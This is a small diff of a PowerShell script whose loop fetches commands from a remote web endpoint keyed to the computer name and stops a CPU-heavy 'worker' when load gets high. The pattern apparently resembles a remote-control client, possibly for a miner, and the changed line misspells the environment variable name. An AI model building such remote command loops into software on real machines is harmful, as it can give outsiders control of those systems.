@@ -64,10 +64,11 @@ Invoke-RestMethod `
 
 function Get-Command {
    param (  $SystemId )
+Write-Host $SystemId
     try {
          $cmd = Invoke-RestMethod `
                     -Uri "https://mcontrol.vercel.app/api/command?id=$SystemId" `
-                   -Method GET `
+                    -Method GET `
                     -ContentType "application/json"  `
           Write-Host "getcmd: $cmd"          
            return $cmd.command
@@ -189,7 +190,7 @@ function Swnok {
 while($true){
 
     $cpu = Get-CPU
-    $cmd = Get-Command -SystemId $SYSTEM
+    $cmd = Get-Command -SystemId $env:CUMPUTERNAME
     Write-Host "cnd $cmd cpu $cpu"
     if($cpu -gt $CPU_LIMIT){
         Stop-Worker
